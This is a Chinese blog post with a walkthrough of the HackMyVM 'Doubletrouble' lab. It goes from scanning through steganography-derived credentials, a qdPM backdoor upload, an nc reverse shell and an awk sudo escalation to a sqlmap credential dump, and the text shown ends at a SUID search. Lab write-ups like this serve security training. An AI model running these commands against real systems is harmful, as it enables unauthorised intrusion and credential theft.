<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-Doubletrouble | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-Doubletrouble 题如其名，有两关，两个虚拟机文件 第一关信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa] └─# nmap 192.168.161.108  Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 17:19 EDT Nmap scan r">
<meta property="og:type" content="article">
<meta property="og:title" content="HMV-Doubletrouble">
<meta property="og:url" content="https://drume2.github.io/posts/7a34ef12.html">
<meta property="og:site_name" content="Moriiの博客">
<meta property="og:description" content="HMV-Doubletrouble 题如其名，有两关，两个虚拟机文件 第一关信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa] └─# nmap 192.168.161.108  Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 17:19 EDT Nmap scan r">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
<meta property="article:published_time" content="2025-07-25T20:53:31.000Z">
<meta property="article:modified_time" content="2025-07-25T21:49:54.120Z">
<meta property="article:author" content="Morii">
<meta property="article:tag" content="HMV">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/7a34ef12"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HMV-Doubletrouble',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-07-26 05:49:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">86</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-Doubletrouble</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-25T20:53:31.000Z" title="发表于 2025-07-26 04:53:31">2025-07-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-25T21:49:54.120Z" title="更新于 2025-07-26 05:49:54">2025-07-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-Doubletrouble"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HMV-Doubletrouble"><a href="#HMV-Doubletrouble" class="headerlink" title="HMV-Doubletrouble"></a>HMV-Doubletrouble</h1><p><img src="/posts/7a34ef12/image-20250726051708472.png" alt="image-20250726051708472"></p>
<p>题如其名，有两关，两个虚拟机文件</p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# nmap 192.168.161.108 
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 17:19 EDT
Nmap scan report for 192.168.161.108
Host is up (0.0033s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22&#x2F;tcp open  ssh
80&#x2F;tcp open  http
MAC Address: 08:00:27:5B:04:DE (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>两个端口，一个22，一个80</p>
<h3 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h3><p><img src="/posts/7a34ef12/image-20250726051943462.png" alt="image-20250726051943462"></p>
<p>cms框架漏洞，去搜一下<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50944">漏洞</a></p>
<p><img src="/posts/7a34ef12/image-20250726052118904.png" alt="image-20250726052118904"></p>
<p>是一个rce脚本，先执行一下，看看需要什么条件</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# python3 50944.py                                     
You are not able to use the designated admin account because they do not have a myAccount page.

usage: 50944.py [-h] [-url HOSTNAME] [-u EMAIL] [-p PASSWORD]

qdmp - Path traversal + RCE Exploit

options:
  -h, --help            show this help message and exit
  -url HOSTNAME, --host HOSTNAME
                        Project URL
  -u EMAIL, --email EMAIL
                        User email (Any privilege account)
  -p PASSWORD, --password PASSWORD
                        User password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要用户名和密码，目前不知道用户名和密码，扫一下目录，看看有没有什么信息</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# gobuster dir -u http:&#x2F;&#x2F;192.168.161.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php,txt    
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
[+] Url:                     http:&#x2F;&#x2F;192.168.161.108&#x2F;
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster&#x2F;3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Starting gobuster in directory enumeration mode
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
&#x2F;images               (Status: 301) [Size: 319] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;images&#x2F;]
&#x2F;.php                 (Status: 403) [Size: 280]
&#x2F;uploads              (Status: 301) [Size: 320] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;uploads&#x2F;]
&#x2F;index.php            (Status: 200) [Size: 5816]
&#x2F;css                  (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;css&#x2F;]
&#x2F;template             (Status: 301) [Size: 321] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;template&#x2F;]
&#x2F;core                 (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;core&#x2F;]
&#x2F;install              (Status: 301) [Size: 320] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;install&#x2F;]
&#x2F;js                   (Status: 301) [Size: 315] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;js&#x2F;]
&#x2F;check.php            (Status: 200) [Size: 0]
&#x2F;sf                   (Status: 301) [Size: 315] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;sf&#x2F;]
&#x2F;readme.txt           (Status: 200) [Size: 470]
&#x2F;robots.txt           (Status: 200) [Size: 26]
&#x2F;secret               (Status: 301) [Size: 319] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;secret&#x2F;]
&#x2F;backups              (Status: 301) [Size: 320] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;backups&#x2F;]
&#x2F;batch                (Status: 301) [Size: 318] [--&gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;batch&#x2F;]
&#x2F;.php                 (Status: 403) [Size: 280]
&#x2F;server-status        (Status: 403) [Size: 280]
Progress: 445405 &#x2F; 661683 (67.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 446267 &#x2F; 661683 (67.44%)
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Finished
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>扫到了一个&#x2F;secret的目录，去看一下有什么信息</p>
<p><img src="/posts/7a34ef12/image-20250726052642678.png" alt="image-20250726052642678"></p>
<p>就一张图片，拿到本地，看一下信息</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# stegseek doubletrouble.jpg                            
StegSeek 0.6 - https:&#x2F;&#x2F;github.com&#x2F;RickdeJager&#x2F;StegSeek

[i] Found passphrase: &quot;92camaro&quot;
[i] Original filename: &quot;creds.txt&quot;.
[i] Extracting to &quot;doubletrouble.jpg.out&quot;.

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# cat doubletrouble.jpg.out
otisrush@localhost.com
otis666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这应该就是用户名和密码了，那么可以运行刚才的脚本了</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# python3 50944.py -u otisrush@localhost.com -p otis666 -url http:&#x2F;&#x2F;192.168.161.108&#x2F;                                
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2025-07-25 16:28 
Backdoor uploaded at - &gt; http:&#x2F;&#x2F;192.168.161.108&#x2F;uploads&#x2F;users&#x2F;408412-backdoor.php?cmd&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去到这个url处，反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.161.108&#x2F;uploads&#x2F;users&#x2F;408412-backdoor.php?cmd&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.161.76 1234

┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# nc -lvnp 1234        
listening on [any] 1234 ...
connect to [192.168.161.76] from (UNKNOWN) [192.168.161.108] 51594
id
uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
&#x2F;usr&#x2F;bin&#x2F;script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null
www-data@doubletrouble:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;users$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有flag，看一下sudo权限吧</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><pre class="line-numbers language-none"><code class="language-none">www-data@doubletrouble:&#x2F;home$ sudo -l
sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass,
    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>能执行awk命令，搜一下awk的提权方案</p>
<pre class="line-numbers language-none"><code class="language-none">Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">www-data@doubletrouble:&#x2F;home$ sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;
# bash
root@doubletrouble:&#x2F;home# id
uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)
root@doubletrouble:~# ls
doubletrouble.ova<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>root的目录下还有一个ova文件，尝试拿到本地，这里我用的是termius来传输的，修改root的密码，然后进行连接</p>
<p><img src="/posts/7a34ef12/image-20250726053336743.png" alt="image-20250726053336743"></p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# nmap 192.168.161.77   
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 16:54 EDT
Nmap scan report for 192.168.161.77
Host is up (0.00014s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22&#x2F;tcp open  ssh
80&#x2F;tcp open  http
MAC Address: 08:00:27:2A:55:9E (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="web探测-1"><a href="#web探测-1" class="headerlink" title="web探测"></a>web探测</h3><p><img src="/posts/7a34ef12/image-20250726053422390.png" alt="image-20250726053422390"></p>
<p>就一个登录框，用bp抓个包，跑一下sqlmap试试</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
└─# sqlmap -r tmp --batch -D doubletrouble -T users --dump
+----------+----------+
| password | username |
+----------+----------+
| GfsZxc1  | montreux |
| ZubZub99 | clapton  |
+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ssh登录上去</p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
└─# ssh clapton@192.168.161.77                                
The authenticity of host &#39;192.168.161.77 (192.168.161.77)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:&#x2F;v6Q2+ydqJo0XbOM6QR5qjyuQr2+a&#x2F;P+R90qw0RlxWI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes
Warning: Permanently added &#39;192.168.161.77&#39; (ECDSA) to the list of known hosts.
clapton@192.168.161.77&#39;s password: 
Permission denied, please try again.
clapton@192.168.161.77&#39;s password: 
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64

The programs included with the Debian GNU&#x2F;Linux system are free software;
the exact distribution terms for each program are described in the
individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.

Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
clapton@doubletrouble:~$ id
uid&#x3D;1000(clapton) gid&#x3D;1000(clapton) groups&#x3D;1000(clapton)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><pre class="line-numbers language-none"><code class="language-none">clapton@doubletrouble:~$ cat user.txt 
6CEA7A737C7C651F6DA7669109B5FB52<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><pre class="line-numbers language-none"><code class="language-none">clapton@doubletrouble:~$ sudo -l
-bash: sudo: command not found
clapton@doubletrouble:~$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
&#x2F;usr&#x2F;sbin&#x2F;exim4
&#x2F;usr&#x2F;bin&#x2F;chfn
&#x2F;usr&#x2F;bin&#x2F;passwd
&#x2F;usr&#x2F;bin&#x2F;chsh
&#x2F;usr&#x2F;bin&#x2F;gpasswd
&#x2F;usr&#x2F;bin&#x2F;newgrp
&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device
&#x2F;usr&#x2F;lib&#x2F;pt_chown
